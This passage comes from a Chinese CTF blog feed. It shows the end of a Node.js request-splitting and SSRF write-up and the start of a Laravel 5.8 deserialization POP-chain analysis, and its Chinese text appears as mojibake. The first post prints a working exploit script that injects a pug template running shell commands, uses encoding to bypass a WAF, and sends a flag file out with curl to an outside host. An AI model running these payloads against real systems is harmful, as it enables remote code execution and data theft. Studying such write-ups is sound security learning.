&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://a4d0ae70-d877-43de-8158-ed2b3c8fcb75.node4.buuoj.cn:81/core?q=&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†ä¼šæ„é€ å‡ºè¿™ç§ç©æ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133631155.png" alt="image-20211206133631155">&lt;/p>
&lt;p>å¦å¤–pugæ¨¡æ¿é™¤äº†åŒ…å«flag.txtä»¥å¤–è¿˜å¯ä»¥è·Ÿä¸Šé¢nullconçš„é¢˜ä¸€æ ·ç”¨curlè¯·æ±‚æ¥å¤–å¸¦flagï¼›ç¨å¾®ä¿®æ”¹ä¸€ä¸‹expå³å¯&lt;/p>
&lt;p>æ”¾ä¸€ä¸‹&lt;a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">å®˜æ–¹exp.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payloadRaw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;x HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: localhost:8081
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept-Encoding: gzip, deflate
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Length: 6279
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Origin: http://localhost:8081
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Referer: http://localhost:8081/?action=upload
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Upgrade-Insecure-Requests: 1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">-----------------------------12837266501973088788260782942
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;5am3_get_flag.pug&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: ../template
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">- global.process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;evalcmd&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">-----------------------------12837266501973088788260782942--
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">getParm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%8D%C4%8A&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A2&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A7&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;`&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A1&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%2B&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%3B&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;amp;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%26&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Bypass Waf&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B2%C5%AF%C5%AF%C5%B4&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5&lt;/span>&lt;span style="color:#d88200">%9F&lt;/span>&lt;span style="color:#d88200">%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A5%C5%B8%C5%A5%C5%A3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payloadC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payloadRaw&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;evalcmd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">urlC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/core?q=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">getParm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payloadC&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">urlC&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/?action=5am3_get_flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">targetUrl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">targetUrl&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># python exp.py http://127.0.0.1:8081 &amp;#34;curl eval.com -X POST -d `cat /flag.txt`&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>å®ä¸ç›¸ç’ï¼Œæˆ‘è¢«éƒ¨åˆ†ç¼–ç æ—¶åº”è¯¥ç¼–å“ªä¸€äº›è¿™ä¸ªé—®é¢˜å›°æ‰°äº†ä¸€å¤©ï¼Œç»å†äº†næ¬¡çš„ç¯å¢ƒå´©æºƒå’Œå¥½å¤šå¥½å¤šä»¤äººæ— è¯­çš„æƒ…å†µï¼›å…¶å®ç”¨å…¨ç¼–ç å°±æ˜¯æœ€ç®€å•å¿«æ·çš„ï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³è‡ªå·±æŠ˜è…¾ä¸€ä¸‹&lt;/p>
&lt;p>è¿™ä¸ªç³»åˆ—ä¸‹ä¸€ç¯‡åº”è¯¥æ˜¯HTTPè¯·æ±‚èµ°ç§æˆ–è€…æ˜¯302è·³è½¬ssrfç›¸å…³çš„ï¼Œä¸è¿‡è¿‘æœŸåº”è¯¥æ˜¯ä¸ä¼šå†ç¢°jsäº†ï¼Œåƒåœ¾Node.jsï¼Œæ¯æˆ‘é’æ˜¥&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://capec.mitre.org/data/definitions/220.html">CAPEC-220: Client-Server Protocol Manipulation&lt;/a> | &lt;a href="https://capec.mitre.org/data/definitions/105.html">CAPEC-105: HTTP Request Splitting&lt;/a> | &lt;a href="https://capec.mitre.org/data/definitions/33.html">CAPEC-33: HTTP Request Smuggling&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/nodejs/node/commit/dd20c0186f">http: add &amp;ndash;security-revert for CVE-2018-12116&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/Hpd0ger/My_ctf_challenge/tree/master/Isoon2019-Membershop">Membershop - docker&lt;/a> | &lt;a href="https://github.com/nullcon/hackim-2020/tree/master/web/split_second">Split second - docker&lt;/a> | &lt;a href="https://github.com/5am3/My-CTF-Challenges/tree/master/2020-icq-gys">Node Game - docker&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501">Proxy-Proxy - wp&lt;/a> | &lt;a href="https://www.wolai.com/ctfhub/hj3e9WMu8X4ePZ3sADXfsH">Membershop - wp&lt;/a> | &lt;a href="https://ctftime.org/writeup/18293">Split second - wp1&lt;/a> | &lt;a href="https://r3billions.com/writeup-split-second/">Split second - wp2&lt;/a> | &lt;a href="https://blog.p6.is/nullcon-hackim-2020-split-second/">Split second - wp3&lt;/a> | &lt;a href="https://www.zhaoj.in/read-6462.html">Node Game - wp&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Laravel-5.8.xååºåˆ—åŒ–popé“¾å­¦ä¹ </title><link>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</link><pubDate>Sat, 04 Dec 2021 14:11:02 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</guid><description>&lt;p>äº²è‡ªä»å¤´åˆ°å°¾è·Ÿäº†ä¸€ä¸‹æ¶‰åŠåˆ°çš„ä¸‰ä¸ªé“¾å­ï¼Œç¨å¾®æ‹¯æ•‘äº†ä¸€ç‚¹ç‚¹ç‚¹ç‚¹æˆ‘ç¨€çƒ‚çš„ä»£ç å®¡è®¡èƒ½åŠ›&lt;/p>
&lt;p>å‚è€ƒé“¾æ¥æ”¾åœ¨æ–‡æœ«&lt;/p>
&lt;hr>
&lt;h2 id="é“¾å­1---æ–‡ä»¶åŒ…å«ä»»æ„æ–‡ä»¶è¯»å–">é“¾å­1 - æ–‡ä»¶åŒ…å«/ä»»æ„æ–‡ä»¶è¯»å–&lt;/h2>
&lt;p>æœç´¢&lt;code>__desturct()&lt;/code>æ‰¾å…¥æ‰‹ç‚¹ï¼Œ vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203153626429.png" alt="image-20211203153626429">&lt;/p>
&lt;p>å®ƒè°ƒç”¨äº†&lt;code>commit()&lt;/code>å’Œ&lt;code>invalidateTags()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164858978.png" alt="image-20211203164858978">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164931565.png" alt="image-20211203164931565">&lt;/p>
&lt;p>è°ƒç”¨poolçš„&lt;code>saveDeferred()&lt;/code>æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªç±»ç›¸åŒå‘½åç©ºé—´(Symfony\Component\Cache\Adapter)ä¸‹æ‰¾æœ‰æ²¡æœ‰åˆ«çš„ç±»ä¹Ÿå®ç°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¦å¤–å¼€å§‹çš„é‚£ä¸ªpoolæ˜¯åœ¨Adapteræ¥å£ä¸‹ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªAdapterInterfaceæ¥å£å¹¶ä¸”å­˜åœ¨&lt;code>saveDeferred()&lt;/code>çš„ç±»&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165435637.png" alt="image-20211203165435637">&lt;/p>
&lt;p>æ‰¾åˆ°è¿™é‡Œvendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165151335.png" alt="image-20211203165151335">&lt;/p>
&lt;p>å®ƒåˆè°ƒç”¨äº†initialize()ï¼Œè·Ÿè¿› vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165212155.png" alt="image-20211203165212155">&lt;/p>
&lt;p>æ˜¯æˆ‘ä»¬çš„æ–‡ä»¶åŒ…å«ç‚¹äº†ï¼Œå¯ä»¥ä»è¿™é‡Œè¯»flag&lt;/p>
&lt;p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ expäº†ï¼Œè¦æ³¨æ„å‘½åç©ºé—´å’Œæ¥å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170050397.png" alt="image-20211203170050397">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170036701.png" alt="image-20211203170036701">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png" alt="image-20211203170020908">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png" alt="image-20211203165959349">&lt;/p>
&lt;p>å‰ä¸¤ä¸ªç±»éƒ½æ˜¯Symfony\Component\Cache\Adapterå‘½åç©ºé—´ä¸‹çš„ï¼Œä½†æ˜¯CacheItemæ˜¯Symfony\Component\Cacheä¸‹çš„ï¼Œæ‰€ä»¥è¦å†å¼•å…¥å®ƒï¼Œuse&lt;/p>
